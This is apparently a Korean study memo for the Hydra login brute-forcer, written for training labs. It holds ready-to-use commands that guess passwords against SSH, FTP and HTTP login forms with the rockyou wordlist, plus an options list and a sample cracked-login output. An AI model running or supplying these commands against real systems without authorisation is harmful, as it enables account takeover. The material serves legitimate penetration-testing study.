# hydra 핵심 메모

```bash
# 설치 (kali는 기본 설치)
sudo apt update && sudo apt install -y hydra

# ssh brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10

# ftp brute force
hydra -l anonymous -P pass.txt ftp://10.10.10.10

# http-post-form (로그인 폼)
hydra -L user.txt -P pass.txt 10.10.10.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=로그인실패문구"
hydra -l think -P password.txt ssh://10.10.67.138 --t 40 -v
hydra -l scr1ptkiddy -P passwords.txt 10.10.136.50 http-post-form \
"/silverpeas/jsp/login.jsp:username=^USER^&password=^PASS^&DomainId=0:Location"

# 주요 옵션
# -l : 단일 사용자명
# -L : 사용자명 리스트
# -P : 패스워드 리스트
# -s : 포트 지정
# -V : 시도하는 계정/패스워드 실시간 출력
# -t : 동시 스레드 수 (기본 16)
# -f : 첫 성공시 멈춤

# 결과 예시
# [22][ssh] host: 10.10.10.10 login: root password: 123456
```
